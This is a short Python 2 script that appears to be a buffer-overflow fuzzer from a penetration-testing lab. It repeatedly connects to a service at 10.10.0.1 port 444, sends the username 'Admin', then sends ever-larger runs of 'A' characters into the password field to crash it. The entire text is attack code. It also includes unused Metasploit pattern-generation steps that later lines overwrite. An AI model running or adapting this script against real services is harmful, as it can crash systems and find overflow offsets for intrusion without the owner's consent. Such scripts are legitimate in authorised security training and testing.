#!/usr/bin/python
import sys, socket, time, os, traceback


targetIP="10.10.0.1"

try:
  print "\nSending evil buffer..."

  # create pattern using msf-pattern_create
  size = 2560
  myCMD = "msf-pattern_create -l {0}"
  stream = os.popen(myCMD.format(str(size)))
  myPattern = stream.read()
  myPattern = myPattern.strip()


  buffer = 4000*"A"
  buffer = myPattern

  i = 100 


  while i<=20000:
     print("Sending buffer of size " + str(i))
     s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
     buffer = "A"*i

     s.connect((targetIP, 444))
     banner = s.recv(1024)
     print(banner)

     s.send("Admin")
     banner=s.recv(1024)
     print(banner)
	
     # send the bof on the pass
     s.send(buffer)
	
     s.close()
     i = i + 100
     time.sleep(2)

except Exception as e:
    print "\nCould not connect!"
    print(e)
    print(traceback.format_exc())
    sys.exit()
